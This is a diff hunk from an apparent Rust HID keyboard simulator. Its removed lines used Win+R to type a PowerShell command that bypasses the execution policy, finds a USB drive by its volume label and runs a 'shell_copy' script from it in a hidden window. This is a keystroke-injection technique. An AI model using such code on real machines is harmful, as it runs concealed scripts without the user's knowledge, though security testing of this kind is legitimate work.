@@ -57,20 +57,20 @@ fn main() -> std::io::Result<()> {
     key_helper.press_cmd(&cmd)?;
     key_helper.press_one(Key::Enter)?; // 目前不用管理员启动，管理员则是ctrl + shift + enter
 
-    // 2. 停两秒，保证监听程序启动。
-    sleep(Duration::from_millis(2000));
+    // // 2. 停两秒，保证监听程序启动。
+    // sleep(Duration::from_millis(2000));
 
-    // 3. 启动真正的 shell_copy 程序。
-    let cmd2 = format!("powershell -ExecutionPolicy Bypass -command \"$d = \
-    (Get-WmiObject -Query 'SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName=\\\"{driver_name}\\\"').DeviceID; \
-    Start-Process -WindowStyle Hidden -FilePath \\\"powershell\\\" -ArgumentList \\\"-File ${{d}}\\{script_path}\\\"\"");
+    // // 3. 启动真正的 shell_copy 程序。
+    // let cmd2 = format!("powershell -ExecutionPolicy Bypass -command \"$d = \
+    // (Get-WmiObject -Query 'SELECT DeviceID FROM Win32_LogicalDisk WHERE VolumeName=\\\"{driver_name}\\\"').DeviceID; \
+    // Start-Process -WindowStyle Hidden -FilePath \\\"powershell\\\" -ArgumentList \\\"-File ${{d}}\\{script_path}\\\"\"");
 
-    info!("HID simulator: cmd2: {}", cmd2);
+    // info!("HID simulator: cmd2: {}", cmd2);
 
-    key_helper.press_multi(&[Key::LeftMeta, Key::R])?;
-    sleep(Duration::from_millis(500));
-    key_helper.press_cmd(&cmd2)?;
-    key_helper.press_one(Key::Enter)?; // 目前不用管理员启动，管理员则是ctrl + shift + enter
+    // key_helper.press_multi(&[Key::LeftMeta, Key::R])?;
+    // sleep(Duration::from_millis(500));
+    // key_helper.press_cmd(&cmd2)?;
+    // key_helper.press_one(Key::Enter)?; // 目前不用管理员启动，管理员则是ctrl + shift + enter
 
     Ok(())
 }
